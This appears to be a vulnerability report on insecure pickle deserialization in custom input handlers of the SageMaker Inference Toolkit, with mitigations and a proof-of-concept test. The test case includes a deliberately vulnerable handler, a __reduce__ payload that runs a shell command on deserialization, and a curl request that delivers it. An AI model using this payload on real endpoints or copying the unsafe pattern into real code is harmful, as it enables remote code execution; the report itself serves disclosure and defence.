### Vulnerability List for SageMaker Inference Toolkit

* Vulnerability Name: Insecure Deserialization in Custom Inference Handler (`input_fn`)
* Description:
    1. An attacker identifies that a SageMaker endpoint is using the SageMaker Inference Toolkit and potentially a custom inference handler.
    2. The attacker crafts a malicious payload specifically designed for insecure deserialization vulnerabilities (e.g., using `pickle` in Python).
    3. The attacker sends an inference request to the SageMaker endpoint.
    4. This request is processed by the model server, which invokes the custom inference handler's `input_fn` to deserialize the input data.
    5. If the custom `input_fn` uses insecure deserialization methods (like `pickle.loads`) without proper sanitization, the malicious payload is deserialized.
    6. During deserialization, the crafted payload executes arbitrary code within the container.
* Impact:
    - Arbitrary code execution within the SageMaker inference container.
    - Potential for data exfiltration, including model weights and sensitive environment variables.
    - Modification of model behavior, leading to incorrect or malicious inference results.
    - Denial of Service by crashing the container or consuming excessive resources.
    - Lateral movement to other AWS resources if the container's IAM role is overly permissive.
* Vulnerability Rank: Critical
* Currently Implemented Mitigations:
    - None. The toolkit provides default safe decoders for common content types (JSON, CSV, NPY, NPZ), but it does not prevent users from implementing custom `input_fn` functions with insecure deserialization practices.
* Missing Mitigations:
    - **Input Validation and Sanitization Guidance:** The toolkit documentation should strongly emphasize the risks of insecure deserialization and provide clear guidelines on secure input handling practices.
    - **Security Best Practices Documentation:** Include a dedicated security section in the documentation, specifically warning against insecure deserialization and recommending safe alternatives.
    - **Code Examples and Secure Templates:** Provide code examples and templates that demonstrate secure input handling and deserialization techniques for custom inference handlers.
    - **Static Analysis or Linting Recommendations:** Recommend or integrate static analysis tools or linters that can detect potential insecure deserialization patterns in user-provided `input_fn` implementations.
* Preconditions:
    1. A SageMaker endpoint must be deployed using the SageMaker Inference Toolkit.
    2. The deployed endpoint must be configured to use a custom inference handler (`inference.py`) that overrides the `default_input_fn`.
    3. The custom `input_fn` implementation must use insecure deserialization methods (e.g., `pickle.loads` in Python) on the input data without proper sanitization.
    4. The attacker must have network access to send requests to the SageMaker endpoint.
* Source Code Analysis:
    1. **`src/sagemaker_inference/transformer.py` - `transform` method:**
        - The `transform` method is the core handler for inference requests. It's responsible for orchestrating the inference pipeline.
        - The method calls `self.validate_and_initialize()` to set up the inference environment and handlers.
        - It retrieves the request body (`input_data`) and content type.
        - It then calls `self._run_handler_function` to execute either `self._transform_fn` or, by default if `transform_fn` is not provided, the sequence `self._input_fn`, `self._predict_fn`, and `self._output_fn`.
        - If a custom `transform_fn` is not provided, the input data processing starts with `self._input_fn`.
        - **Vulnerable Point:** The `input_data`, received directly from the request, is passed as an argument to `self._input_fn`. The `Transformer` class and the toolkit, in general, do not perform any checks or sanitization on the user-provided `input_fn` implementation. This means if a user's `input_fn` deserializes this data insecurely, the toolkit will execute it without any safeguards.
    2. **`src/sagemaker_inference/default_inference_handler.py` - `default_input_fn`:**
        - The `default_input_fn` is designed to be a safe fallback. It uses `decoder.decode(input_data, content_type)` to deserialize the input.
        - **Mitigation:** The `default_input_fn` itself is not vulnerable because it relies on the `decoder.decode` function which uses safe deserialization methods for supported content types (JSON, CSV, NPY, NPZ).
    3. **`src/sagemaker_inference/decoder.py` - `decode` function and decoders:**
        - The `decode` function acts as a dispatcher, selecting a specific decoder based on the `content_type`.
        - The provided decoders (`_json_to_numpy`, `_csv_to_numpy`, `_npy_to_numpy`, `_npz_to_sparse`) use safe methods for their respective formats (e.g., `json.loads` for JSON, `numpy.load` for NPY).
        - **Mitigation:** The default decoders provided by the toolkit are designed to be safe against common deserialization vulnerabilities.
    4. **User-provided `input_fn` in `inference.py`:**
        - **Vulnerability:** The vulnerability is introduced when users create a custom `inference.py` and implement their own `input_fn` function, overriding the default. If this custom `input_fn` uses insecure deserialization functions like Python's `pickle.loads` without proper input validation, it becomes a significant security risk. The toolkit does not prevent or warn against this practice.

        ```mermaid
        graph LR
            A[Inference Request] --> B(Transformer.transform);
            B --> C{Validate & Initialize Handlers};
            C --> D{Custom transform_fn?};
            D -- Yes --> E(Run custom transform_fn);
            D -- No --> F(Run default transform flow);
            F --> G(Run input_fn);
            G --> H(Run predict_fn);
            H --> I(Run output_fn);
            G -- Insecure Deserialization in custom input_fn --> J[Arbitrary Code Execution];
            E -- Insecure Deserialization in custom transform_fn (via input_fn) --> J;
            J --> K[Compromised Container];
        ```

* Security Test Case:
    1. **Setup:**
        - Create a custom `inference.py` file with a vulnerable `input_fn` using `pickle.loads`:
        ```python
        # inference.py
        import pickle
        from sagemaker_inference import default_inference_handler

        class PickleInferenceHandler(default_inference_handler.DefaultInferenceHandler):
            def default_input_fn(self, input_data, content_type, context=None):
                return pickle.loads(input_data)  # INSECURE DESERIALIZATION

            def default_model_fn(self, model_dir, context=None):
                return "dummy_model"

            def default_predict_fn(self, data, model, context=None):
                return {"data": data}

            def default_output_fn(self, prediction, accept, context=None):
                return str(prediction)

        HANDLER_SERVICE = PickleInferenceHandler()
        ```
        - Build a Docker image incorporating this `inference.py` and deploy it to a SageMaker endpoint.
    2. **Craft Malicious Payload:**
        - Use the following Python script to generate a base64-encoded pickled payload that will execute `touch /tmp/pwned` inside the container when deserialized:
        ```python
        import pickle
        import base64
        import os

        class RCE(object):
            def __reduce__(self):
                cmd = ('touch /tmp/pwned')
                return (os.system, (cmd,))

        payload = base64.b64encode(pickle.dumps(RCE())).decode()
        print(payload)
        ```
        - Execute the script and copy the generated base64 payload.
    3. **Send Malicious Request:**
        - Send a POST request to your SageMaker endpoint using `curl` or `requests`. Replace `YOUR_SAGEMAKER_ENDPOINT_URL` and `YOUR_BASE64_PAYLOAD` with your actual endpoint URL and the base64 payload from the previous step:
        ```bash
        BASE64_PAYLOAD="YOUR_BASE64_PAYLOAD"
        ENDPOINT_URL="YOUR_SAGEMAKER_ENDPOINT_URL"

        curl -X POST \
             -H "Content-Type: application/octet-stream" \
             -d "$(echo $BASE64_PAYLOAD | base64 -d)" \
             $ENDPOINT_URL
        ```
    4. **Verify Vulnerability:**
        - **Verification Method 1 (Ideal but might require container access):** If possible, access the container's shell (e.g., via SageMaker Studio if configured or through container logs if file system access is logged). Check if the file `/tmp/pwned` exists within the container's filesystem. Its presence confirms successful code execution.
        - **Verification Method 2 (Indirect via side-effects):**  If direct container access isn't feasible, modify the payload to perform an observable action that reflects in logs or external systems (if network access is configured for the container). For example, attempt to write to a shared volume log file or make an outbound HTTP request to a controlled server and check for the request.
        - **Expected Result:** If the vulnerability is present, the command `touch /tmp/pwned` (or your chosen observable action) will be executed inside the container, indicating successful arbitrary code execution due to insecure deserialization in the custom `input_fn`.